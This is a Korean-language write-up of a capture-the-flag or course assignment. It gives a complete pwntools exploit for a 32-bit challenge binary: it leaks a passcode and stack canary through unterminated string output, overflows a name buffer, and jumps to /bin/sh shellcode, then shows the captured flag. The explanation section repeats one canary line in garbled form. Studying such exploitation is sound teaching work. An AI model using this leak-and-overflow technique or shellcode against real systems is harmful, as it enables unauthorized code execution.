# **완성 전체 코드**

```python
from pwn import *

context.log_level = 'debug'

r = process('HackTheWoo.o')
#r = remote('221.149.226.120', 31338)

# main printf
r.recvuntil(b'\n\n')

def select_option(num):
    r.recvuntil(b'application\n')
    r.sendline(str(num).encode())

# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'1234')
r.recvuntil(b'[name]\n')
r.send(b'a'*40)
r.recvuntil(b'[grade]\n')
r.send(b'b'*5)

#print_info
select_option(2)
r.recvuntil(b'a'*40)
passcode = r.recvuntil(b'\n')[0:4]
r.recvuntil(b'\n')

# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'2018131321')
r.recvuntil(b'[name]\n')
r.send(b'hyunwoo')
r.recvuntil(b'[grade]\n')
r.send(b'A+')
r.recvuntil(b'passcode:\n')
r.send(passcode)

# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
temp = b'a'*40 + passcode
temp += b'a'*4
r.send(temp)
r.recvuntil(b'you.\n')
stack = r.recvuntil(b'\n')[:-1]
stack = int(stack, 16)

# print_info
select_option(2)
r.recvuntil(b'b'*3)
canary = r.recvuntil(b'\n')[0:3]
canary = u32(b'\x00'+canary)

# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a' * (40-len(shellcode))
ex += passcode
ex += b'a'*4
ex += b'A+aa'
ex += p32(canary)
ex += b'a'*4
ex += p32(stack)
r.send(ex)

for i in range(6, 10):
    select_option(i)

r.interactive()
```

---

# **설명**

```python
# main printf
r.recvuntil(b'\n\n')

def select_option(num):
    r.recvuntil(b'application\n')
    r.sendline(str(num).encode())
```

- `r.recvuntil(b'\n\n')` 은 main함수의 `Professor's grade ...` 부분을 입력받음
- `select_option` 함수는 c코드의 `menu` 함수의 출력 부분을 입력받고, 입력받은 int값 num을 넘겨줘서 `scanf("%d", &num)` 부분에 입력함
    - 입력받은 num값을 통해서 진행될 함수가 결정됨

**초기값 입력**

```python
# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'1234')  # student->number
r.recvuntil(b'[name]\n')
r.send(b'a'*40) # student->name
r.recvuntil(b'[grade]\n')
r.send(b'b'*5) #student->grade
```

- 처음에는 1을 입력해 `input` 함수를 실행함
- input함수의 초반에 나오는 출력(printf) 부분을 모두 `r.recvuntil(b'[student number]\n')` 으로 받아옴
- `scanf("%d", &student->student_number);` 에 해당하는 값은 `1234` 로 입력함
    - scanf이기 때문에 `sendline` 을 사용해 입력
- `read(0, student->name, 40);` 에 해당하는 값은 `r.send(b'a'*40)` 로 입력함
    - `a*40` 을 40바이트 길이의 배열의 크기에 딱 맞게 입력해줌
- `read(0, student->grade, 5);` 에 해당하는 값은 `r.send(b'b'*5)` 로 입력함
    - `grade` 는 4바이트의 배열이므로 b로 모든 값을 채워주고, canary의 첫 번째 바이트 부분도 b로 변경해줌

**passcode 탈취**

```python
#print_info
select_option(2)
r.recvuntil(b'a'*40)
passcode = r.recvuntil(b'\n')[0:4]
r.recvuntil(b'\n')
```

- 2를 입력해 `print_info` 함수를 호출함
- `printf("name : %s\n", student->name);` 로 passcode를 탈취하려고 시도함
    - 이미 input을 통해 name배열을 a로 채워뒀고, printf는 널값을 만날때까지 모든 출력을 진행함(`Null Byte Overwrite`)
    - a*40까지 출력된 부분을 먼저 들고옴
    - `passcode = r.recvuntil(b'\n')[0:4]` 에서 name 배열 이후의 passcode 부분에 해당하는 출력값(출력된 부분의 0~3)을 탈취해 passcode변수에 저장함
- 모든 printf로 출력된 값을 받아줌 `r.recvuntil(b'\n')`

**input함수에서 passcode를 이용해 grade를 A+로 설정함**

```python
# input_operation
select_option(1)
r.recvuntil(b'[student number]\n')
r.sendline(b'2018131321')
r.recvuntil(b'[name]\n')
r.send(b'hyunwoo')
r.recvuntil(b'[grade]\n')
r.send(b'A+')
r.recvuntil(b'passcode:\n')
r.send(passcode)
```

- input함수에서 student_number, name, grade를 입력함
- 이때, 원래 grade값과 canary 첫 번째 바이트까지 `b*5`지만 `A+` 을 입력해서 `A+bbb` 형태로 변경함
- grade값이 A+가 들어갔으므로 if문이 실행되고 `read(0, passcode, 4);` 코드에 탈취한 passcode값을 입력해줌
    - 이때, 입력한 passcode와 stack의 passcode는 같은 값임

**grade가 A+인 상태로 stack buffer overflow 진행, name 주소 탈취**

```python
# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
temp = b'a'*40 + passcode
temp += b'a'*4
r.send(temp)
r.recvuntil(b'you.\n')
stack = r.recvuntil(b'\n')[:-1]
stack = int(stack, 16)
```

- 3번을 입력해 `graduate_school_application`을 실행함
- grade값이 A+이므로 Congratulation!~ 부분부터 실행됨
- ~name\n 이전의 출려값을 모두 입력받음
- `a*40+passcode+a*4` 크기의 값을 `read(0, student->name, 100);` 에 넣어줌
    - read는 100바이트 크기를 입력받을 수 있으므로 name, passcode, student_number값을 덮을 수 있음
    - 이때 name은 a*40, passcode는 기존의 passcode값, student_number는 a*4가 됨
- student_nuber값은 int형이므로 `input` 함수에서는 무조건 int형태로 입력해야 한다. 또한 sendline을 사용하므로 \n값이 마지막에 무조건 들어간다. 따라서 print_info함수로 값을 탈취하려고 해도 탈취할 수가 없다. 따라서 graduate_school_application함수에서 값을 덮어버리는 과정이 필요하다.
- stack은 `printf("%p\n", &student->name);` 값으로부터 name배열의 주소값을 얻어온다.

**print_info함수로 canary값 탈취**

```python
# print_info
select_option(2)
r.recvuntil(b'b'*3)
canary = r.recvuntil(b'\n')[0:3]
canary = canary = r.recvuntil(b'\n')[0:3]
```

- student_number값이 덮어써졌으므로, `printf("name : %s\n", student->name);` 코드로 \n을 만날때까지 값을 출력함
- 현재 grade값은 `A*bb` 이고 canary의 첫 번째 값은 `b` 이므로 `r.recvuntil(b'b'*3)` 코드를 통해 canary의 첫 번째 바이트 값 까지 얻어올 수 있음
- 이후 `canary = r.recvuntil(b'\n')[0:3]` 코드로 4바이트 카나리의 첫 번째 값을 제외한 나머지 값을 얻어오고 `canary = r.recvuntil(b'\n')[0:3]` 과정을 거쳐 canary값을 탈취한다.

**stack buffer overflow 발생**

```python
# graduate_school_application
select_option(3)
r.recvuntil(b'name\n')
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a' * (40-len(shellcode))
ex += passcode
ex += b'a'*4
ex += b'A+aa'
ex += p32(canary)
ex += b'a'*4
ex += p32(stack)
r.send(ex)

for i in range(6, 10):
    select_option(i)

r.interactive()
```

- canary값과 name 배열 주소값을 모두 탈취 했으므로 필요한 값들을 모두 얻었다.
- graduate_school_application함수를 진행해 name 40바이트 배열에 들어갈 ex값을 계산한다
- 이후 passcode는 기존 값을, student_number는 a*4값을, grade는 A+aa로 A+로 맞춰준다.
- 이후 탈취한 canary값을 붙이고, SFP는 a*4, RET는 name 배열의 주소값을 넣어줌

- 마지막으로 menu함수는 10번 실행하므로 남은 횟수도 실행할 수 있게 for문을 작성
- 값은 1,2,3이 아닌 값으로 에러가 발생할 수 있게 설정함

```powershell
$ ./malicious
Congratulations!
Please enter your student ID, and I'll give you the flag.
$ 2018131321
Please copy and paste the following content into the report.
Assignment2_flag{424960885128585659360728767}
```

`flag` : `Assignment2_flag{424960885128585659360728767}`